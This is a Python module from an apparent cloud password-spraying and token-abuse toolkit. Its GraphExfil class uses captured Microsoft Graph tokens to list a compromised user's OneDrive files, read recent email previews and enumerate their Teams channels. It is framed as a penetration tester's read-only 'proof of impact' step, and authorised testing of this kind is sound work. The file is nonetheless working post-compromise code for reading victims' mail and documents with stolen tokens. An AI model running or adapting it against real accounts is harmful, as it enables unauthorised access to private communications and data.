"""Lightweight data access demonstration using captured Microsoft Graph tokens.

After tokens are captured (via direct auth or FOCI exchange), this module
uses them to make authenticated requests to the Microsoft Graph API and
demonstrate the level of access achieved. This is the "proof of impact"
step that shows a client what an attacker could access with the compromised
credentials.

Three data access methods are available:

- **OneDrive** -- Lists root-level files to show document access
- **Email** -- Reads recent messages to show mailbox access
- **Teams** -- Enumerates team memberships and channels

All methods use read-only Graph API calls. No data is modified or exfiltrated
in bulk -- this is designed to demonstrate access scope, not to actually
steal data.

The module looks up Graph API tokens from the state database, filtering for
tokens scoped to ``graph.microsoft.com`` that have not yet expired.
"""

import logging
from datetime import datetime, timezone

import requests

from cloudspray.reporting.console import ConsoleReporter
from cloudspray.state.db import StateDB

logger = logging.getLogger(__name__)


class GraphExfil:
    """Lightweight data access using captured Microsoft Graph API tokens.

    Uses read-only Graph API endpoints to demonstrate the impact of
    compromised credentials. Can be used as a context manager for
    automatic HTTP session cleanup.

    Usage::

        with GraphExfil(db, reporter) as exfil:
            results = exfil.run_all("user@contoso.com")

    Args:
        db: State database containing captured tokens.
        reporter: Console reporter for status output.
    """

    GRAPH_BASE = "https://graph.microsoft.com/v1.0"

    def __init__(self, db: StateDB, reporter: ConsoleReporter):
        self._db = db
        self._reporter = reporter
        self._session = requests.Session()

    def close(self) -> None:
        """Close the underlying HTTP session."""
        self._session.close()

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()
        return False

    def _get_graph_token(self, username: str) -> str | None:
        """Get a Graph API access token for the user from the DB.

        Looks for tokens where the resource contains 'graph.microsoft.com'.
        Skips tokens that have already expired.
        Returns the token string or None if not found.
        """
        now = datetime.now(timezone.utc)
        tokens = self._db.get_tokens()
        for token in tokens:
            if token.username != username:
                continue
            if "graph.microsoft.com" not in token.resource:
                continue
            if token.expires_at is not None and token.expires_at <= now:
                logger.debug("Skipping expired token for %s", username)
                continue
            return token.access_token
        return None

    def _graph_get(self, access_token: str, path: str) -> dict | None:
        """Make an authenticated GET request to the Graph API.

        Returns the JSON response dict, or None on failure.
        """
        url = f"{self.GRAPH_BASE}{path}"
        headers = {
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json",
        }

        try:
            response = self._session.get(url, headers=headers, timeout=30)
        except requests.RequestException as exc:
            self._reporter.error(f"Graph API request failed: {exc}")
            return None

        if response.status_code == 401:
            self._reporter.debug("Graph API: token expired or invalid (401)")
            return None

        if response.status_code == 403:
            self._reporter.debug("Graph API: insufficient permissions (403)")
            return None

        if response.status_code != 200:
            self._reporter.debug(
                f"Graph API returned {response.status_code}: {response.text[:200]}"
            )
            return None

        return response.json()

    def list_onedrive_files(self, username: str, max_items: int = 25) -> list[dict]:
        """List root OneDrive files.

        GET /me/drive/root/children
        Returns list of file metadata dicts (name, size, lastModified, webUrl).
        """
        access_token = self._get_graph_token(username)
        if not access_token:
            self._reporter.error(f"No Graph token found for {username}")
            return []

        data = self._graph_get(
            access_token, f"/me/drive/root/children?$top={max_items}"
        )
        if not data:
            return []

        files = []
        for item in data.get("value", []):
            files.append({
                "name": item.get("name", ""),
                "size": item.get("size", 0),
                "lastModified": item.get("lastModifiedDateTime", ""),
                "webUrl": item.get("webUrl", ""),
            })

        self._reporter.info(f"OneDrive for {username}: {len(files)} file(s) found")
        return files

    def read_recent_emails(self, username: str, count: int = 10) -> list[dict]:
        """Read recent emails.

        GET /me/messages?$top={count}&$orderby=receivedDateTime desc
        Returns list of email metadata dicts (subject, from, receivedDateTime, bodyPreview).
        """
        access_token = self._get_graph_token(username)
        if not access_token:
            self._reporter.error(f"No Graph token found for {username}")
            return []

        path = f"/me/messages?$top={count}&$orderby=receivedDateTime%20desc"
        data = self._graph_get(access_token, path)
        if not data:
            return []

        emails = []
        for msg in data.get("value", []):
            sender = msg.get("from", {})
            sender_address = sender.get("emailAddress", {}).get("address", "")

            emails.append({
                "subject": msg.get("subject", ""),
                "from": sender_address,
                "receivedDateTime": msg.get("receivedDateTime", ""),
                "bodyPreview": msg.get("bodyPreview", ""),
            })

        self._reporter.info(f"Emails for {username}: {len(emails)} message(s) retrieved")
        return emails

    def list_teams_conversations(self, username: str) -> list[dict]:
        """List Teams team memberships and recent channels.

        GET /me/joinedTeams then GET /teams/{id}/channels for each.
        Returns list of team/channel dicts.
        """
        access_token = self._get_graph_token(username)
        if not access_token:
            self._reporter.error(f"No Graph token found for {username}")
            return []

        teams_data = self._graph_get(access_token, "/me/joinedTeams")
        if not teams_data:
            return []

        results = []
        for team in teams_data.get("value", []):
            team_id = team.get("id", "")
            team_name = team.get("displayName", "")

            channels_data = self._graph_get(
                access_token, f"/teams/{team_id}/channels"
            )

            channels = []
            if channels_data:
                for channel in channels_data.get("value", []):
                    channels.append({
                        "channelName": channel.get("displayName", ""),
                        "description": channel.get("description", ""),
                    })

            results.append({
                "teamName": team_name,
                "teamId": team_id,
                "channels": channels,
            })

        self._reporter.info(
            f"Teams for {username}: {len(results)} team(s) found"
        )
        return results

    def run_all(self, username: str) -> dict:
        """Run all data access checks for a user and return combined results.

        Args:
            username: The email address to check data access for.
                Must have a valid Graph API token in the database.

        Returns:
            Dict with keys ``onedrive_files``, ``recent_emails``, and
            ``teams_conversations``, each containing a list of result dicts.
        """
        self._reporter.info(f"Running data access checks for {username}")

        return {
            "onedrive_files": self.list_onedrive_files(username),
            "recent_emails": self.read_recent_emails(username),
            "teams_conversations": self.list_teams_conversations(username),
        }
